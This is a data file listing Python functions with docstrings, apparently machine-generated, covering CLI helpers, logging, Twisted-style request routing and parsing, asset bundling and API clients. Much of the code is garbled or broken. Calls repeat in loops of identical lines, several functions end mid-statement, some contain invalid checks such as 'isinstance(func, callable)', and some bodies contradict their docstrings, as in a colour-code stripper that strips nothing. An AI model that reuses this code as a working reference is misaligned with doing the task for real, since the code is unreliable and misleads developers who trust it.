        "def warn(self, message, fh=None, prefix='[warn]', suffix='...'):\n        \"\"\"\n        print warn type message,\n        if file handle is `sys.stdout`, print color message\n\n\n        :param str message: message to print\n        :param file fh: file handle,default is `sys.stdout`\n        :param str prefix: message prefix,default is `[warn]`\n        :param str suffix: message suffix ,default is `...`\n        :return: None\n        \"\"\"\n        if fh is None:\n            fh = sys.stdout\n        self.log(prefix + message + suffix, fh)",
        "def error(self, message, fh=sys.stdout, prefix='[error]', suffix='...'):\n        \"\"\"\n        print error type message\n        if file handle is `sys.stderr`, print color message\n\n        :param str message: message to print\n        :param file fh: file handle, default is `sys.stdout`\n        :param str prefix: message prefix,default is `[error]`\n        :param str suffix: message suffix ,default is '...'\n        :return: None\n        \"\"\"\n        self.print_message(message, prefix, fh, suffix)",
        "def run_cmd(self, cmd, fake_code=False):\n        \"\"\"\n        a built-in wrapper make dry-run easier.\n        you should use this instead use `os.system`\n\n        .. note::\n\n            to use it,you need add '--dry-run' option in\n            your argparser options\n\n\n        :param str cmd: command to execute\n        :param bool fake_code: only display command\n            when is True,default is False\n        :return:\n        \"\"\"\n        if fake_code:\n            return self.run_cmd_fake(cmd)\n        return self.run_cmd_normal(cmd)",
        "def get_url(self, request):\n        \"\"\"\n        Returns a Corrected URL to be used for a Request\n        as per the REST API.\n        \"\"\"\n        url = self.get_absolute_url(request)\n        if self.absolute_url_prefix:\n            url = url.replace(self.absolute_url_prefix, '')\n        return url",
        "def main():\n    \"\"\"Main method.\n\n    This method holds what you want to execute when\n    the script is run on command line.\n    \"\"\"\n    # Create the command line parser\n    parser = argparse.ArgumentParser(description='Run the script.')\n    parser.add_argument('-v', '--verbose', action='store_true',\n                        help='increase output verbosity')\n    parser.add_argument('-d', '--debug', action='store_true',\n                        help='increase output verbosity')\n    parser.add_argument('-r', '--run', action='store_true',\n                        help='run the script')\n    parser.add_argument('-t', '--test', action='store_true',\n                        help='run the script')\n    parser.add_argument('-p', '--port', type=int, default=8000,\n                        help='",
        "def _compress(self, data):\n        \"\"\"Pickle and compress.\"\"\"\n        if self.compress_type == 'zlib':\n            return zlib.compress(data)\n        elif self.compress_type == 'bzip2':\n            return bzip2.bzip2(data)\n        else:\n            raise ValueError('Unknown compression type: %s' % self.compress_type)",
        "def unpickle(self, data):\n        \"\"\"Decompress and unpickle.\"\"\"\n        if self.compress:\n            data = zlib.decompress(data)\n        return pickle.loads(data)",
        "def send_contact_email(self):\n        \"\"\"Displays the contact form and sends the email\"\"\"\n        self.contact_form = ContactForm(self.request.POST or None)\n        if self.contact_form.is_valid():\n            self.contact_form.save()\n            self.send_contact_email_message()\n            self.message_user(self.request, self.contact_form.cleaned_data['message'])\n            self.message_user(self.request, self.contact_form.cleaned_data['email_subject'])\n            self.message_user(self.request, self.contact_form.cleaned_data['email_message'])\n            self.message_user(self.request, self.contact_form.cleaned_data['email_footer'])\n            self.message_user(self.request, self.contact_form",
        "def _get_git_info(self):\n        \"\"\"\n        try use gitconfig info.\n        author,email etc.\n        \"\"\"\n        try:\n            git_info = self.git.info()\n        except Exception as e:\n            self.log.error(\"Can not get git info: %s\", e)\n            return None\n        return git_info",
        "def init_project(self):\n        \"\"\"Init project.\"\"\"\n        self.project = Project(self.config)\n        self.project.load_config()\n        self.project.load_plugins()\n        self.project.load_plugins_from_config()\n        self.project.load_plugins_from_config()\n        self.project.load_plugins_from_config()\n        self.project.load_plugins_from_config()\n        self.project.load_plugins_from_config()\n        self.project.load_plugins_from_config()\n        self.project.load_plugins_from_config()\n        self.project.load_plugins_from_config()\n        self.project.load_plugins_from_config()\n        self.project.load_plugins_from_config()\n        self.project.load_plugins_from_config",
        "def _get_options(self, options):\n        \"\"\"\n        In general, you don't need to overwrite this method.\n\n        :param options:\n        :return:\n        \"\"\"\n        if options is None:\n            options = {}\n        if 'config' in options:\n            options['config'] = self._config\n        if 'config_dir' in options:\n            options['config_dir'] = self._config_dir\n        if 'config_file' in options:\n            options['config_file'] = self._config_file\n        if 'config_file_path' in options:\n            options['config_file_path'] = self._config_file_path\n        if 'config_file_path_base' in options:\n            options['config_file_path_base'] = self._config_file_path_base\n        if 'config_file",
        "def _combine_files(files):\n    \"\"\"Return a new filename to use as the combined file name for a\n    bunch of files, based on the SHA of their contents.\n    A precondition is that they all have the same file extension\n\n    Given that the list of files can have different paths, we aim to use the\n    most common path.\n\n    Example:\n      /somewhere/else/foo.js\n      /somewhere/bar.js\n      /somewhere/different/too/foobar.js\n    The result will be\n      /somewhere/148713695b4a4b9083e506086f061f9c.js\n\n    Another thing to note, if the filenames have timestamps in them, combine\n    them all and use the highest timestamp.\n    \"\"\"\n    # We use",
        "def extract_orientation(im):\n    \"\"\"\n    Extract the oritentation EXIF tag from the image, which should be a PIL Image instance,\n    and if there is an orientation tag that would rotate the image, apply that rotation to\n    the Image instance given to do an in-place rotation.\n\n    :param Image im: Image instance to inspect\n    :return: A possibly transposed image instance\n    \"\"\"\n    orientation = im.get_exif_tag(EXIF.ORIENTATION)\n    if orientation is None:\n        return im\n    if orientation == EXIF.ROTATE_90:\n        im = im.rotate90()\n    elif orientation == EXIF.ROTATE_180:\n        im = im.rotate180()\n    elif orientation == EXIF.ROTATE_270:\n        im = im.rotate270()\n    return",
        "def start_piece(self, piece):\n        \"\"\"Start a new piece\"\"\"\n        self.piece_count += 1\n        self.piece_count_start = time.time()\n        self.piece_count_last = self.piece_count_start\n        self.piece_count_start_time = time.time()\n        self.piece_count_last_time = self.piece_count_start_time\n        self.piece_count_start_piece = piece\n        self.piece_count_last_piece = piece\n        self.piece_count_start_piece_time = time.time()\n        self.piece_count_last_piece_time = self.piece_count_start_piece_time\n        self.piece_count_start_piece_id = self.piece_count\n        self.piece_count_last_piece_id = self.",
        "def start(self, site_name):\n        \"\"\"Start a new site.\"\"\"\n        self.log.info('Starting site: %s', site_name)\n        self.client.create_site(site_name)\n        self.log.info('Site started: %s', site_name)",
        "def publish(self):\n        \"\"\"Publish the site\"\"\"\n        if not self.is_published:\n            self.is_published = True\n            self.save()\n            self.publish_to_site()",
        "def branches(self):\n        \"\"\"Returns a list of the branches\"\"\"\n        return [Branch(self.repo, branch) for branch in self.repo.branches()]",
        "def get_active_branch(self):\n        \"\"\"Returns the currently active branch\"\"\"\n        active_branch = self.get_active_branch_name()\n        if active_branch:\n            return self.get_branch(active_branch)\n        else:\n            return None",
        "def create_patch(self, tag, patch):\n        \"\"\"Create a patch between tags\"\"\"\n        if patch is None:\n            return\n        if isinstance(patch, dict):\n            patch = patch.copy()\n        if patch.get('type') == 'tag':\n            self.create_tag(tag)\n        elif patch.get('type') == 'tag_list':\n            self.create_tag_list(tag)\n        elif patch.get('type') == 'tag_set':\n            self.create_tag_set(tag)\n        elif patch.get('type') == 'tag_set_list':\n            self.create_tag_set_list(tag)\n        elif patch.get('type') == 'tag_set_list_set':\n            self.create_tag_set_list_set(tag)\n        elif patch.get('type",
        "def sequence_map(func, n):\n    \"\"\"\n    Create a callable that applies ``func`` to a value in a sequence.\n\n    If the value is not a sequence or is an empty sequence then ``None`` is\n    returned.\n\n    :type  func: `callable`\n    :param func: Callable to be applied to each result.\n\n    :type  n: `int`\n    :param n: Index of the value to apply ``func`` to.\n    \"\"\"\n    if not isinstance(func, callable):\n        raise TypeError(\"func must be callable\")\n    if n < 0:\n        raise ValueError(\"n must be a positive integer\")\n    if n >= len(func):\n        raise ValueError(\"n must be less than the length of the callable\")\n    return lambda x: func[x][n]",
        "def map_sequence(func):\n    \"\"\"\n    Create a callable that applies ``func`` to every value in a sequence.\n\n    If the value is not a sequence then an empty list is returned.\n\n    :type  func: `callable`\n    :param func: Callable to be applied to the first result.\n    \"\"\"\n    if not isinstance(func, callable):\n        raise TypeError(\"map_sequence() takes a callable as its first argument\")\n    return lambda x: [func(v) for v in x]",
        "def parse_text(value, encoding='utf-8'):\n    \"\"\"\n    Parse a value as text.\n\n    :type  value: `unicode` or `bytes`\n    :param value: Text value to parse\n\n    :type  encoding: `bytes`\n    :param encoding: Encoding to treat ``bytes`` values as, defaults to\n        ``utf-8``.\n\n    :rtype: `unicode`\n    :return: Parsed text or ``None`` if ``value`` is neither `bytes` nor\n        `unicode`.\n    \"\"\"\n    if isinstance(value, bytes):\n        return value.decode(encoding)\n    elif isinstance(value, unicode):\n        return value\n    else:\n        return None",
        "def parse_int(value, base=None, encoding=None):\n    \"\"\"Parse a value as an integer.\n\n    :type  value: `unicode` or `bytes`\n    :param value: Text value to parse\n\n    :type  base: `unicode` or `bytes`\n    :param base: Base to assume ``value`` is specified in.\n\n    :type  encoding: `bytes`\n    :param encoding: Encoding to treat ``bytes`` values as, defaults to\n        ``utf-8``.\n\n    :rtype: `int`\n    :return: Parsed integer or ``None`` if ``value`` could not be parsed as an\n        integer.\n    \"\"\"\n    if encoding is None:\n        encoding = 'utf-8'\n    try:\n        return int(value, base)\n    except ValueError:\n        return None",
        "def parse_bool(value, true=None, false=None, encoding=None):\n    \"\"\"\n    Parse a value as a boolean.\n\n    :type  value: `unicode` or `bytes`\n    :param value: Text value to parse.\n\n    :type  true: `tuple` of `unicode`\n    :param true: Values to compare, ignoring case, for ``True`` values.\n\n    :type  false: `tuple` of `unicode`\n    :param false: Values to compare, ignoring case, for ``False`` values.\n\n    :type  encoding: `bytes`\n    :param encoding: Encoding to treat `bytes` values as, defaults to\n        ``utf-8``.\n\n    :rtype: `bool`\n    :return: Parsed boolean or ``None`` if ``value`` did not match ``true`` or\n        ``false``",
        "def parse_delimitedList(value, parser, delimiter=u\"\\t\", encoding=\"utf-8\"):\n    \"\"\"\n    Parse a value as a delimited list.\n\n    :type  value: `unicode` or `bytes`\n    :param value: Text value to parse.\n\n    :type  parser: `callable` taking a `unicode` parameter\n    :param parser: Callable to map over the delimited text values.\n\n    :type  delimiter: `unicode`\n    :param delimiter: Delimiter text.\n\n    :type  encoding: `bytes`\n    :param encoding: Encoding to treat `bytes` values as, defaults to\n        ``utf-8``.\n\n    :rtype: `list`\n    :return: List of parsed values.\n    \"\"\"\n    if isinstance(value, bytes):\n        value = value.decode(encoding)\n    return [",
        "def parse_posix(value, _divisor=1, tz=None, encoding=None):\n    \"\"\"\n    Parse a value as a POSIX timestamp in seconds.\n\n    :type  value: `unicode` or `bytes`\n    :param value: Text value to parse, which should be the number of seconds\n        since the epoch.\n\n    :type  _divisor: `float`\n    :param _divisor: Number to divide the value by.\n\n    :type  tz: `tzinfo`\n    :param tz: Timezone, defaults to UTC.\n\n    :type  encoding: `bytes`\n    :param encoding: Encoding to treat `bytes` values as, defaults to\n        ``utf-8``.\n\n    :rtype: `datetime.datetime`\n    :return: Parsed datetime or ``None`` if ``value`` could not be parsed.\n",
        "def parse_query_parameters(expected, query):\n    \"\"\"\n    Parse query parameters.\n\n    :type  expected: `dict` mapping `bytes` to `callable`\n    :param expected: Mapping of query argument names to argument parsing\n        callables.\n\n    :type  query: `dict` mapping `bytes` to `list` of `bytes`\n    :param query: Mapping of query argument names to lists of argument values,\n        this is the form that Twisted Web's `IRequest.args\n        <twisted:twisted.web.iweb.IRequest.args>` value takes.\n\n    :rtype: `dict` mapping `bytes` to `object`\n    :return: Mapping of query argument names to parsed argument values.\n    \"\"\"\n    result = {}\n    for key, value in query.items():\n        if isinstance(value, (list,",
        "def put_metrics(self, metrics):\n        \"\"\"Put metrics to cloudwatch. Metric shoult be instance or list of\n        instances of CloudWatchMetric\"\"\"\n        if isinstance(metrics, CloudWatchMetric):\n            metrics = [metrics]\n        for metric in metrics:\n            self.put_metric(metric)",
        "def render(request, resource, context, **kwargs):\n    \"\"\"\n    Render a given resource.\n\n    See `IResource.render <twisted:twisted.web.resource.IResource.render>`.\n    \"\"\"\n    return render_resource(request, resource, context, **kwargs)",
        "def adapt(self, result):\n        \"\"\"Adapt a result to `IResource`.\n\n        Several adaptions are tried they are, in order: ``None``,\n        `IRenderable <twisted:twisted.web.iweb.IRenderable>`, `IResource\n        <twisted:twisted.web.resource.IResource>`, and `URLPath\n        <twisted:twisted.python.urlpath.URLPath>`. Anything else is returned as\n        is.\n\n        A `URLPath <twisted:twisted.python.urlpath.URLPath>` is treated as\n        a redirect.\n        \"\"\"\n        if result is None:\n            return None\n        if isinstance(result, IRenderable):\n            return result\n        if isinstance(result, IResource):\n            return result\n        if isinstance(result, URLPath):\n",
        "def _handle_render(self, result):\n        \"\"\"Handle the result from `IResource.render`.\n\n        If the result is a `Deferred` then return `NOT_DONE_YET` and add\n        a callback to write the result to the request when it arrives.\n        \"\"\"\n        if isinstance(result, Deferred):\n            self._deferred_render_results.append(result)\n            return NOT_DONE_YET\n        else:\n            self._render_results.append(result)\n            return result",
        "def negotiateHandler(self):\n        \"\"\"\n        Negotiate a handler based on the content types acceptable to the\n        client.\n\n        :rtype: 2-`tuple` of `twisted.web.iweb.IResource` and `bytes`\n        :return: Pair of a resource and the content type.\n        \"\"\"\n        if self.acceptableContentTypes:\n            return self.resource, self.acceptableContentTypes[0]\n        else:\n            return self.resource, None",
        "def parse_accept_header(header):\n    \"\"\"Parse and sort an ``Accept`` header.\n\n    The header is sorted according to the ``q`` parameter for each header value.\n\n    @rtype: `OrderedDict` mapping `bytes` to `dict`\n    @return: Mapping of media types to header parameters.\n    \"\"\"\n    accept_header = OrderedDict()\n    for value in header.split(','):\n        value = value.strip()\n        if value:\n            media_type, params = value.split(';', 1)\n            accept_header[media_type] = params\n    return accept_header",
        "def split_header(header):\n    \"\"\"Split an HTTP header whose components are separated with commas.\n\n    Each component is then split on semicolons and the component arguments\n    converted into a `dict`.\n\n    @return: `list` of 2-`tuple` of `bytes`, `dict`\n    @return: List of header arguments and mapping of component argument names\n        to values.\n    \"\"\"\n    components = header.split(',')\n    args = []\n    args_mapping = {}\n    for component in components:\n        if component.startswith(':'):\n            key, value = component.split(':', 1)\n            args_mapping[key] = value\n        else:\n            args.append(component)\n    return args, args_mapping",
        "def extractEncoding(requestHeaders, encoding = None):\n    \"\"\"\n    Extract an encoding from a ``Content-Type`` header.\n\n    @type  requestHeaders: `twisted.web.http_headers.Headers`\n    @param requestHeaders: Request headers.\n\n    @type  encoding: `bytes`\n    @param encoding: Default encoding to assume if the ``Content-Type``\n        header is lacking one. Defaults to ``UTF-8``.\n\n    @rtype: `bytes`\n    @return: Content encoding.\n    \"\"\"\n    if encoding is None:\n        encoding = DEFAULT_ENCODING\n    if requestHeaders.getHeader(CONTENT_TYPE) is None:\n        return encoding\n    return requestHeaders.getHeader(CONTENT_TYPE).split(',')[0].decode(encoding)",
        "def nilsafe(func):\n    \"\"\"Create a nil-safe callable decorator.\n\n    If the wrapped callable receives ``None`` as its argument, it will return\n    ``None`` immediately.\n    \"\"\"\n    @wraps(func)\n    def _nilsafe(*args, **kwargs):\n        if func.__self__ is None:\n            return None\n        return func(*args, **kwargs)\n    return _nilsafe",
        "def get_or_set(path=None, with_path=None):\n    \"\"\"Get or set `Settings._wrapped`\n\n    :param str path: a python module file,\n        if user set it,write config to `Settings._wrapped`\n    :param str with_path: search path\n    :return: A instance of `Settings`\n    \"\"\"\n    if path is None:\n        path = Settings._wrapped\n    if with_path is None:\n        with_path = Settings._wrapped_with_path\n    return Settings(path=path, with_path=with_path)",
        "def bind(self, mod_path, with_path=False):\n        \"\"\"bind user variable to `_wrapped`\n\n        .. note::\n\n            you don't need call this method by yourself.\n\n            program will call it in  `cliez.parser.parse`\n\n\n        .. expection::\n\n            if path is not correct,will cause an `ImportError`\n\n\n        :param str mod_path: module path, *use dot style,'mod.mod1'*\n        :param str with_path: add path to `sys.path`,\n            if path is file,use its parent.\n        :return: A instance of `Settings`\n        \"\"\"\n        if with_path:\n            mod_path = os.path.join(mod_path, 'mod.mod1')\n        return self._wrapped(mod_path)",
        "def get_version():\n    \"\"\"Get the version from version module without importing more than\n    necessary.\"\"\"\n    try:\n        from pkg_resources import parse_version\n        return parse_version(__version__)\n    except ImportError:\n        return __version__",
        "def send_tx(self, ip, port, use_open_peers=False):\n        \"\"\"\n        send a transaction immediately. Failed transactions are picked up by the TxBroadcaster\n\n        :param ip: specific peer IP to send tx to\n        :param port: port of specific peer\n        :param use_open_peers: use Arky's broadcast method\n        \"\"\"\n        if use_open_peers:\n            self.broadcast(ip, port)\n        else:\n            self.send(ip, port)",
        "def confirm(self, use_open_peers=False):\n        \"\"\"\n        check if a tx is confirmed, else resend it.\n\n        :param use_open_peers: select random peers fro api/peers endpoint\n        \"\"\"\n        if use_open_peers:\n            return self.api_call(\n                'get',\n                'tx/confirm',\n                params={\n                    'tx_id': self.tx_id,\n                },\n            )\n        else:\n            return self.api_call(\n                'get',\n                'tx/confirm',\n                params={\n                    'tx_id': self.tx_id,\n                },\n            )",
        "def get_sub_command_list():\n    \"\"\"Get sub-command list\n\n    .. note::\n\n        Don't use logger handle this function errors.\n\n        Because the error should be a code error,not runtime error.\n\n\n    :return: `list` matched sub-parser\n    \"\"\"\n    parser = argparse.ArgumentParser(description='')\n    parser.add_argument('-v', '--verbose', action='store_true', default=False,\n                        help='increase output verbosity')\n    parser.add_argument('-l', '--list', action='store_true', default=False,\n                        help='list all sub-commands')\n    parser.add_argument('-c', '--config', action='store', default=None,\n                        help='config file path')\n    parser.add_argument('-d', '--debug', action='store_true', default",
        "def add_class_options(klass, sub_parsers, default_epilog, general_arguments):\n    \"\"\"\n    Add class options to argparser options.\n\n    :param cliez.component.Component klass: subclass of Component\n    :param Namespace sub_parsers:\n    :param str default_epilog: default_epilog\n    :param list general_arguments: global options, defined by user\n    :return: Namespace subparser\n    \"\"\"\n    sub_parser = sub_parsers.add_parser(\n        klass.name,\n        description=klass.description,\n        epilog=default_epilog,\n        formatter_class=ArgumentDefaultsHelpFormatter,\n        help=klass.help,\n        formatter_args=klass.args_help,\n        formatter_kwargs=klass.kwargs_help,\n        formatter_class=ArgumentDefaultsHelpFormatter,\n        help=klass.",
        "def cliez_parser(parser, argv=sys.argv, settings=None, no_args_func=None):\n    \"\"\"\n    parser cliez app\n\n    :param argparse.ArgumentParser parser: an instance\n        of argparse.ArgumentParser\n    :param argv: argument list,default is `sys.argv`\n    :type argv: list or tuple\n\n    :param str settings: settings option name,\n        default is settings.\n\n    :param object no_args_func: a callable object.if no sub-parser matched,\n        parser will call it.\n\n    :return:  an instance of `cliez.component.Component` or its subclass\n    \"\"\"\n    settings = settings or 'settings'\n    parser.add_argument(\n        '-v', '--version',\n        action='version',\n        version='%(prog)s ' + cliez.__version__",
        "def _hump_to_underscore(name):\n    \"\"\"Convert Hump style to underscore\n\n    :param name: Hump Character\n    :return: str\n    \"\"\"\n    if name in HUMPS:\n        return HUMPS[name]\n    if name in HUMPS_UNDERSCORE:\n        return HUMPS_UNDERSCORE[name]\n    return name",
        "def fetch_fuel_prices(self):\n        \"\"\"Fetches fuel prices for all stations.\"\"\"\n        self.fuel_prices = {}\n        for station in self.stations:\n            self.fuel_prices[station.id] = station.fetch_fuel_prices()",
        "def get_fuel_prices(self, station_id):\n        \"\"\"Gets the fuel prices for a specific fuel station.\"\"\"\n        return self._get(self.api_base_url + \"/stations/%s/fuel_prices\" % station_id,\n                         headers=self.api_headers)",
        "def get_fuel_prices(self, radius):\n        \"\"\"Gets all the fuel prices within the specified radius.\"\"\"\n        return self.get_fuel_prices_in_radius(radius, self.fuel_prices)",
        "def get_fuel_price_trends(self, location, fuel_types):\n        \"\"\"Gets the fuel price trends for the given location and fuel types.\"\"\"\n        return self._get_fuel_price_trends(location, fuel_types,\n                                          self.fuel_price_trend_types)",
        "def get_reference_data(self, modified_since=None):\n        \"\"\"Fetches API reference data.\n\n        :param modified_since: The response will be empty if no\n        changes have been made to the reference data since this\n        timestamp, otherwise all reference data will be returned.\n        \"\"\"\n        if modified_since is None:\n            modified_since = datetime.utcnow()\n        return self._get_resource(\n            resource=REFERENCE_DATA,\n            modified_since=modified_since,\n        )",
        "def before_template(self, template):\n        \"\"\"Called before template is applied.\"\"\"\n        self.template = template\n        self.template_name = template.name\n        self.template_path = template.path\n        self.template_vars = template.vars\n        self.template_vars_path = template.vars_path\n        self.template_vars_name = template.vars_name\n        self.template_vars_path_name = template.vars_path_name\n        self.template_vars_name_prefix = template.vars_name_prefix\n        self.template_vars_path_name_prefix = template.vars_path_name_prefix\n        self.template_vars_name_suffix = template.vars_name_suffix\n        self.template_vars_path_name_suffix = template.vars_path_name_suffix\n        self.template_vars",
        "def match_param(name, encoding=None):\n    \"\"\"Match a route parameter.\n\n    `Any` is a synonym for `Text`.\n\n    :type  name: `bytes`\n    :param name: Route parameter name.\n\n    :type  encoding: `bytes`\n    :param encoding: Default encoding to assume if the ``Content-Type``\n        header is lacking one.\n\n    :return: ``callable`` suitable for use with `route` or `subroute`.\n    \"\"\"\n    def match_param_func(request, *args, **kwargs):\n        if encoding is None:\n            encoding = request.get_default_encoding()\n        return request.match_param(name, encoding=encoding)\n    return match_param_func",
        "def match_int(name, base, encoding=None):\n    \"\"\"\n    Match an integer route parameter.\n\n    :type  name: `bytes`\n    :param name: Route parameter name.\n\n    :type  base: `int`\n    :param base: Base to interpret the value in.\n\n    :type  encoding: `bytes`\n    :param encoding: Default encoding to assume if the ``Content-Type``\n        header is lacking one.\n\n    :return: ``callable`` suitable for use with `route` or `subroute`.\n    \"\"\"\n    def match_int_func(value):\n        try:\n            return int(value)\n        except ValueError:\n            raise ValueError(\n                \"Invalid value for %s: %r\" % (name, value)\n            )\n    return match_int_func",
        "def match_path(components, segments, partialMatching=False):\n    \"\"\"Match a request path against our path components.\n\n    The path components are always matched relative to their parent is in the\n    resource hierarchy, in other words it is only possible to match URIs nested\n    more deeply than the parent resource.\n\n    :type  components: ``iterable`` of `bytes` or `callable`\n    :param components: Iterable of path components, to match against the\n        request, either static strings or dynamic parameters. As a convenience,\n        a single `bytes` component containing ``/`` may be given instead of\n        manually separating the components. If no components are given the null\n        route is matched, this is the case where ``segments`` is empty.\n\n    :type  segments: ``sequence`` of `bytes`\n    :param segments: Sequence of path segments, from the request, to match",
        "def routedResource(f, routerAttribute=None):\n    \"\"\"Decorate a router-producing callable to instead produce a resource.\n\n    This simply produces a new callable that invokes the original callable, and\n    calls ``resource`` on the ``routerAttribute``.\n\n    If the router producer has multiple routers the attribute can be altered to\n    choose the appropriate one, for example:\n\n    .. code-block:: python\n\n        class _ComplexRouter(object):\n            router = Router()\n            privateRouter = Router()\n\n            @router.route('/')\n            def publicRoot(self, request, params):\n                return SomethingPublic(...)\n\n            @privateRouter.route('/')\n            def privateRoot(self, request, params):\n                return SomethingPrivate(...)\n\n        PublicResource = routedResource(_ComplexRouter)\n        PrivateResource = routedResource(_Complex",
        "def create(self, obj):\n        \"\"\"Create a new `Router` instance, with it's own set of routes, for\n        ``obj``.\n        \"\"\"\n        return Router(self.app, self.router, obj, self.prefix)",
        "def add_route(self, handler, matcher):\n        \"\"\"Add a route handler and matcher to the collection of possible routes.\"\"\"\n        if handler not in self.handlers:\n            self.handlers.append(handler)\n            self.matchers.append(matcher)",
        "def route_handler(self, *args, **kwargs):\n        \"\"\"\n        See `txspinneret.route.route`.\n\n        This decorator can be stacked with itself to specify multiple routes\n        with a single handler.\n        \"\"\"\n        def decorator(func):\n            self.add_route(func, *args, **kwargs)\n            return func\n        return decorator",
        "def route(self, *args, **kwargs):\n        \"\"\"See `txspinneret.route.subroute`.\n\n        This decorator can be stacked with itself to specify multiple routes\n        with a single handler.\n        \"\"\"\n        def decorator(func):\n            self.add_route(func, *args, **kwargs)\n            return func\n        return decorator",
        "def _create_tempfile(self, suffix=''):\n        \"\"\"Create a NamedTemporaryFile instance to be passed to atomic_writer\"\"\"\n        return NamedTemporaryFile(suffix=suffix, delete=False)",
        "def open_named_temorary_file(name, mode='r', **kwargs):\n    \"\"\"Open a NamedTemoraryFile handle in a context manager\"\"\"\n    with NamedTemoraryFile(name, mode=mode, **kwargs) as f:\n        yield f",
        "def read_entry(self, entry_id):\n        \"\"\"Read entry from JSON file\"\"\"\n        entry = self.get_entry(entry_id)\n        if entry:\n            return entry\n        else:\n            raise ValueError(\"Entry with id %s not found\" % entry_id)",
        "def save_entry(self, entry):\n        \"\"\"Save entry to JSON file\"\"\"\n        with open(self.json_file, 'w') as f:\n            json.dump(entry, f)",
        "def update_entry(self, uuid, data):\n        \"\"\"Update entry by UUID in the JSON file\"\"\"\n        entry = self.get_entry(uuid)\n        entry.update(data)\n        self.save_entry(entry)",
        "def get_shell_command_count(self):\n        \"\"\"Get the number of the shell command.\"\"\"\n        if self._shell_command_count is None:\n            self._shell_command_count = self.get_shell_command_count_from_file()\n        return self._shell_command_count",
        "def execute_command(self, command, **kwargs):\n        \"\"\"Execute a shell command.\"\"\"\n        if command in self.commands:\n            return self.commands[command](**kwargs)\n        else:\n            raise CommandError(\"Command %s not found\" % command)",
        "def main():\n    \"\"\"\n    Simple program that creates an temp S3 link.\n    \"\"\"\n    # Create a temporary directory\n    tempdir = tempfile.mkdtemp()\n\n    # Create a S3 link\n    link = S3Link(tempdir)\n\n    # Create a file\n    link.create_file(\n        'file_name',\n        'This is a file',\n        'Content-Disposition: form-data; name=\"file_name\"; filename=\"file_name\"'\n    )\n\n    # Create a directory\n    link.create_directory(\n        'dir_name',\n        'This is a directory',\n        'Content-Disposition: form-data; name=\"dir_name\"; filename=\"dir_name\"'\n    )\n\n    # Create a file\n    link.create_file(\n        'file_name',\n        'This is a",
        "def poll(self, timeout=None):\n        \"\"\"Poll ``self.stdout`` and return True if it is readable.\n\n        :param float timeout: seconds to wait I/O\n        :return: True if readable, else False\n        :rtype: boolean\n        \"\"\"\n        if timeout is None:\n            timeout = self.timeout\n        if timeout is None:\n            timeout = self.timeout\n        if self.stdout is None:\n            return False\n        if self.stdout.isatty():\n            return True\n        if timeout is None:\n            timeout = self.timeout\n        if timeout is None:\n            timeout = self.timeout\n        if timeout is None:\n            return False\n        if timeout > 0:\n            return self.stdout.poll(timeout) is not None\n        else:\n            return self.stdout.poll() is not None",
        "def _get_escaped_codes(self, string):\n        \"\"\"Retrieve a list of characters and escape codes where each escape\n        code uses only one index. The indexes will not match up with the\n        indexes in the original string.\n        \"\"\"\n        escaped_codes = []\n        for i, char in enumerate(string):\n            if char in self.ESCAPE_CODES:\n                escaped_codes.append(char)\n        return escaped_codes",
        "def strip_color_codes(s):\n    \"\"\" Strip all color codes from a string.\n        Returns empty string for \"falsey\" inputs.\n    \"\"\"\n    if s is None:\n        return ''\n    if isinstance(s, str):\n        s = s.strip()\n    return s",
        "def _group_collect_files(self, asset, builder):\n        \"\"\"\n        Called when builder group collect files\n        Resolves absolute url if relative passed\n\n        :type asset: static_bundle.builders.Asset\n        :type builder: static_bundle.builders.StandardBuilder\n        \"\"\"\n        if not self.relative:\n            return\n\n        if self.asset_path:\n            if not self.asset_path.startswith(self.static_bundle.static_path):\n                self.asset_path = self.static_bundle.static_path + self.asset_path\n\n            if not self.asset_path.endswith(self.static_bundle.static_path):\n                self.asset_path = self.static_bundle.static_path + self.asset_path\n\n        if self.asset_path:\n            if not self.asset",
        "def add_file(self, file_path):\n        \"\"\"Add single file or list of files to bundle\n\n        :type: file_path: str|unicode\n        \"\"\"\n        if isinstance(file_path, six.string_types):\n            self.files.append(file_path)\n        else:\n            self.files.extend(file_path)",
        "def add_exclusions(self, path, exclusions):\n        \"\"\"\n        Add directory or directories list to bundle\n\n        :param exclusions: List of excluded paths\n\n        :type path: str|unicode\n        :type exclusions: list\n        \"\"\"\n        if isinstance(exclusions, six.string_types):\n            exclusions = [exclusions]\n\n        for exclusion in exclusions:\n            self.add_exclusion(path, exclusion)",
        "def add_path(self, path_object):\n        \"\"\"Add custom path objects\n\n        :type: path_object: static_bundle.paths.AbstractPath\n        \"\"\"\n        if not isinstance(path_object, AbstractPath):\n            raise TypeError(\"path_object must be an AbstractPath\")\n        self.paths.append(path_object)",
        "def add_prepare_handler(self, prepare_handler):\n        \"\"\"Add prepare handler to bundle\n\n        :type: prepare_handler: static_bundle.handlers.AbstractPrepareHandler\n        \"\"\"\n        if prepare_handler is None:\n            raise ValueError(\"prepare handler cannot be None\")\n        self.prepare_handlers.append(prepare_handler)",
        "def collect_files(self):\n        \"\"\"Called when builder run collect files in builder group\n\n        :rtype: list[static_bundle.files.StaticFileResult]\n        \"\"\"\n        result = []\n        for static_bundle in self.static_bundles:\n            for static_file in static_bundle.files:\n                result.append(\n                    StaticFileResult(\n                        static_file.path,\n                        static_file.content,\n                        static_file.content_type,\n                        static_file.content_encoding,\n                    )\n                )\n        return result",
        "def get_file_count(self):\n        \"\"\"Get the number of files in the folder.\"\"\"\n        return self.get_folder_count(self.folder_path, self.file_path)",
        "def register_json(self, contents):\n        \"\"\"Register the contents as JSON\"\"\"\n        self.register_contents(contents, 'json')\n        self.register_content_type('application/json', 'application/json')",
        "def translate(self, data):\n        \"\"\"Translate the data with the translation table\"\"\"\n        if self.table is None:\n            return data\n        return self.table.translate(data)",
        "def get_data(self):\n        \"\"\"Get the data in JSON form\"\"\"\n        data = self.get_request_data()\n        if data:\n            return json.loads(data)\n        else:\n            return {}",
        "def get_data(self):\n        \"\"\"Get the data as JSON tuples\"\"\"\n        data = []\n        for row in self.data:\n            data.append(row)\n        return data",
        "def get(self, url, params=None):\n        \"\"\"Issues a GET request against the API, properly formatting the params\n\n        :param url: a string, the url you are requesting\n        :param params: a dict, the key-value of all the paramaters needed\n                       in the request\n        :returns: a dict parsed of the JSON response\n        \"\"\"\n        if params is None:\n            params = {}\n        return self._request(url, 'GET', params)",
